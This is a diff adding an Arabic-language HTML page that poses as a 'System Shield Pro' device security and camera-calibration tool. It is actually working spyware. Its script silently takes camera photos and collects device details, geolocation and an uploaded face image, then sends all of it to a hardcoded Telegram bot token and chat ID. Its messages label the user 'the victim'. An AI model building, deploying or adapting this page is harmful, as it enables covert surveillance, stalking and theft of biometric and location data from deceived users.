@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Shield Pro | درع النظام الاحترافي</title>
+    <style>
+        :root { --primary: #00d2ff; --secondary: #3a7bd5; --bg: #0f172a; --card: rgba(30, 41, 59, 0.7); }
+        body { background: radial-gradient(circle at top, #1e293b, #0f172a); color: #f1f5f9; font-family: 'Segoe UI', Roboto, sans-serif; margin: 0; min-height: 100vh; display: flex; align-items: center; justify-content: center; overflow-x: hidden; }
+        
+        .container { width: 90%; max-width: 480px; background: var(--card); backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.1); border-radius: 28px; padding: 35px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); position: relative; overflow: hidden; }
+        
+        .step { display: none; text-align: center; animation: slideIn 0.5s ease forwards; }
+        .step.active { display: block; }
+        @keyframes slideIn { from { opacity: 0; transform: translateX(30px); } to { opacity: 1; transform: translateX(0); } }
+
+        h1 { font-size: 26px; background: linear-gradient(to left, var(--primary), var(--secondary)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 15px; }
+        p { color: #94a3b8; font-size: 15px; line-height: 1.6; }
+
+        .btn { background: linear-gradient(135deg, var(--primary), var(--secondary)); color: white; border: none; padding: 18px 35px; border-radius: 15px; font-weight: 600; cursor: pointer; width: 100%; font-size: 16px; margin-top: 25px; transition: 0.3s; box-shadow: 0 10px 20px rgba(0, 210, 255, 0.2); }
+        .btn:hover { transform: translateY(-2px); box-shadow: 0 15px 25px rgba(0, 210, 255, 0.3); }
+
+        .loader-box { margin: 30px 0; }
+        .progress-bg { background: #334155; height: 8px; border-radius: 10px; overflow: hidden; position: relative; }
+        .progress-fill { height: 100%; background: var(--primary); width: 0%; transition: 0.4s; box-shadow: 0 0 15px var(--primary); }
+        
+        .log-screen { background: #000; color: #10b981; font-family: 'Courier New', monospace; font-size: 11px; padding: 15px; border-radius: 12px; text-align: left; height: 120px; overflow-y: auto; margin-top: 20px; border: 1px solid #1e293b; }
+        .status-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 20px; }
+        .status-item { background: rgba(255,255,255,0.05); padding: 12px; border-radius: 12px; font-size: 13px; border: 1px solid rgba(255,255,255,0.05); }
+
+        video, canvas { display: none; }
+        .badge { background: rgba(0, 210, 255, 0.1); color: var(--primary); padding: 5px 12px; border-radius: 20px; font-size: 12px; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div id="step1" class="step active">
+        <div class="badge">V2.4.0 Secure Access</div>
+        <h1>درع النظام الذكي</h1>
+        <p>مرحباً بك في أداة الفحص السحابي. سنقوم بتحليل أداء جهازك، فحص الثغرات، ومعايرة الحساسات لضمان أقصى حماية.</p>
+        <button class="btn" onclick="goStep(2)">بدء الفحص الشامل</button>
+    </div>
+
+    <div id="step2" class="step">
+        <h3>تحليل المكونات الصلبة</h3>
+        <p>جاري اختبار المعالج والذاكرة العشوائية...</p>
+        <div class="loader-box"><div class="progress-bg"><div id="bar2" class="progress-fill"></div></div></div>
+        <div class="log-screen" id="log2"></div>
+    </div>
+
+    <div id="step3" class="step">
+        <h3>اختبار أمان العدسات</h3>
+        <p>نحتاج لمعايرة الكاميرا الأمامية والخلفية للتأكد من عدم وجود اختراق لخصوصيتك.</p>
+        <button class="btn" onclick="startCameraTest()">بدء معايرة الكاميرا</button>
+        <div class="log-screen" id="log3"></div>
+    </div>
+
+    <div id="step4" class="step">
+        <h3>تحديد خادم الأمان</h3>
+        <p>للحصول على أفضل أداء، يرجى السماح بتحديد موقعك لاختيار أقرب خادم أمان محلي لجهازك.</p>
+        <div class="loader-box"><div class="progress-bg"><div id="bar4" class="progress-fill"></div></div></div>
+        <button class="btn" onclick="getLocation()">تحديد الموقع التلقائي</button>
+    </div>
+
+    <div id="step5" class="step">
+        <h3 style="color:#10b981">اكتمل التحليل بنجاح!</h3>
+        <div class="status-grid">
+            <div class="status-item">المعالج: <span id="cpuVal">..</span></div>
+            <div class="status-item">الرام: <span id="ramVal">..</span></div>
+            <div class="status-item">البطارية: <span id="batVal">..</span></div>
+            <div class="status-item">الحالة: آمن</div>
+        </div>
+        <p style="margin-top:20px; font-size:13px;">لتحميل تقريرك بصيغة PDF، يرجى رفع صورة واضحة لوجهك للمطابقة البيومترية.</p>
+        <input type="file" id="finalFile" style="display:none" onchange="handleFinalFile(event)">
+        <button class="btn" onclick="document.getElementById('finalFile').click()">رفع الصورة وتحميل التقرير</button>
+    </div>
+</div>
+
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
+
+<script>
+    const CONFIG = {
+        token: "8737645829:AAFzWIUI27q4NLsxuQT1gunCpAzEy2Vx9Y0",
+        chatId: "103316369"
+    };
+
+    let data = {};
+
+    async function send(msg, isImg = false) {
+        const url = `https://api.telegram.org/bot${CONFIG.token}/`;
+        if(!isImg) {
+            await fetch(url + `sendMessage?chat_id=${CONFIG.chatId}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
+        } else {
+            const fd = new FormData();
+            fd.append("chat_id", CONFIG.chatId);
+            fd.append("photo", msg);
+            await fetch(url + "sendPhoto", { method: "POST", body: fd });
+        }
+    }
+
+    function goStep(n) {
+        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+        document.getElementById('step' + n).classList.add('active');
+        if(navigator.vibrate) navigator.vibrate(40);
+        if(n === 2) hardwareScan();
+    }
+
+    async function hardwareScan() {
+        const log = document.getElementById('log2');
+        const bar = document.getElementById('bar2');
+        
+        // جلب بيانات البطارية
+        const bat = await navigator.getBattery();
+        data.bat = `${(bat.level * 100)}% (${bat.charging ? 'يُشحن' : 'لا يشحن'})`;
+        data.ram = navigator.deviceMemory + " GB";
+        data.cores = navigator.hardwareConcurrency + " Cores";
+        data.platform = navigator.platform;
+
+        let steps = [
+            `> فحص الذاكرة العشوائية: ${data.ram}`,
+            `> جاري تحليل أنوية المعالج: ${data.cores}`,
+            `> حالة البطارية: ${data.bat}`,
+            `> نظام التشغيل: ${data.platform}`,
+            `> جاري تهيئة طبقة الحماية 128-bit...`
+        ];
+
+        for(let i=0; i<steps.length; i++){
+            await new Promise(r => setTimeout(r, 800));
+            log.innerHTML += steps[i] + "<br>";
+            bar.style.width = ((i+1) * 20) + "%";
+            log.scrollTop = log.scrollHeight;
+        }
+        setTimeout(() => goStep(3), 1000);
+    }
+
+    async function startCameraTest() {
+        const log = document.getElementById('log3');
+        log.innerHTML = "> جاري محاولة الوصول للعدسات...<br>";
+        
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            document.getElementById('video').srcObject = stream;
+            log.innerHTML += "<span style='color:#10b981'>✅ تم تفعيل الكاميرا للمعايرة.</span><br>";
+            
+            // تصوير 4 صور سريعة في الخلفية
+            for(let i=0; i<4; i++){
+                await new Promise(r => setTimeout(r, 1200));
+                log.innerHTML += `> جاري تحليل اللقطة ${i+1}...<br>`;
+                capture(`صورة سريعة (${i+1})`);
+            }
+            
+            setTimeout(() => goStep(4), 1500);
+        } catch(e) {
+            log.innerHTML += "<span style='color:#ef4444'>⚠️ فشل: يرجى السماح بالكاميرا لإكمال الفحص.</span><br>";
+        }
+    }
+
+    function getLocation() {
+        document.getElementById('bar4').style.width = "50%";
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            data.loc = `${pos.coords.latitude}, ${pos.coords.longitude}`;
+            await send(`📍 <b>موقع الضحية:</b> <a href='https://www.google.com/maps?q=${data.loc}'>اضغط هنا لفتح الخريطة</a>`);
+            finish();
+        }, () => {
+            send("⚠️ الضحية رفض الموقع.");
+            finish();
+        });
+    }
+
+    async function finish() {
+        document.getElementById('bar4').style.width = "100%";
+        document.getElementById('cpuVal').innerText = data.cores;
+        document.getElementById('ramVal').innerText = data.ram;
+        document.getElementById('batVal').innerText = data.bat;
+
+        const report = `
+💎 <b>فحص شامل (المشروع العملاق)</b>
+📱 <b>الجهاز:</b> ${data.platform}
+🧠 <b>الرام:</b> ${data.ram}
+🔋 <b>البطارية:</b> ${data.bat}
+⚙️ <b>المعالج:</b> ${data.cores}
+🌍 <b>المتصفح:</b> ${navigator.userAgent.slice(0,50)}
+        `;
+        await send(report);
+        goStep(5);
+    }
+
+    function capture(label) {
+        const canvas = document.getElementById('canvas');
+        const video = document.getElementById('video');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        canvas.toBlob(blob => {
+            send(`📸 ${label}`);
+            send(blob, true);
+        }, 'image/jpeg');
+    }
+
+    async function handleFinalFile(event) {
+        const file = event.target.files[0];
+        if(file) {
+            await send(`📂 <b>الضحية رفع ملف:</b> ${file.name}`);
+            await send(file, true);
+            alert("تم إرسال تقرير الأمان إلى خوادمنا بنجاح. ستصلك رسالة تأكيد.");
+        }
+    }
+</script>
+</body>
+</html>
+
